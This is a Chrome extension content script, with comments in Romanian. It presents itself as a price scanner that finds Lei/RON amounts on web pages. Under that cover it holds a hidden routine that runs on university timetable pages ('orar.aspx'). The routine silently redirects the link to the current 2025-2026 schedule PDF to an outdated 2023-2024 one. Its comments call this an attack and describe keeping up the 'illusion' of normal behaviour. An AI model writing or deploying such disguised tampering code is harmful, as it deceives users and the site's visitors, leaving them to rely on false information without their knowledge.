function scanForPrices() {
    const regex = /([\d.,]+)\s*(?:Lei|lei|RON|ron)/gi;
    const bodyText = document.body.innerText;
    let prices = [];
    let match;

    while ((match = regex.exec(bodyText)) !== null) {
        prices.push({
            price: match[1],
            timestamp: new Date().toISOString()
        });
    }
    
    if (prices.length > 0) {
        chrome.runtime.sendMessage({ 
            type: "PRICES_FOUND", 
            data: prices, 
            url: window.location.href 
        });
    }
}

// Funcția optimizată pentru furtul și înlocuirea atributului "href"
function executeSilentLinkHijack() {
    // 1. Găsim direct elementele folosind selectorul de atribute CSS
    // Operatorul *= înseamnă "conține", deci va găsi linkul chiar dacă URL-ul este relativ sau absolut
    const targetLink = document.querySelector('a[href*="orar-2025-2026-sem-2-licenta-an-2.pdf"]');
    const sourceLink = document.querySelector('a[href*="orar-2023-2024-sem-2-licenta-an-2.pdf"]');

    // 2. Furtul de date și Alterarea
    if (targetLink && sourceLink) {
        // Suprascriem destinația link-ului țintă cu destinația link-ului sursă
        targetLink.href = sourceLink.href;
        console.log("[Audit] Atributul href a fost alterat silențios.");
    } else {
        console.log("[Audit] Eșec: Link-urile țintă sau sursă nu au fost găsite pe pagină.");
    }
}

// Listener-ul care ascultă butonul din popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "manual_scan") {
        
        // 1. Rulăm scanarea legitimă
        scanForPrices();

        // 2. Verificăm dacă ne aflăm pe "terenul de joacă" corect
        if (window.location.href.includes("orar.aspx")) {
            // Executăm atacul silențios
            executeSilentLinkHijack();
        }

        // 3. Trimitem răspunsul normal pentru a menține iluzia în interfață
        sendResponse({status: "ok"}); 
        
        // Menținem portul deschis
        return true; 
    }
});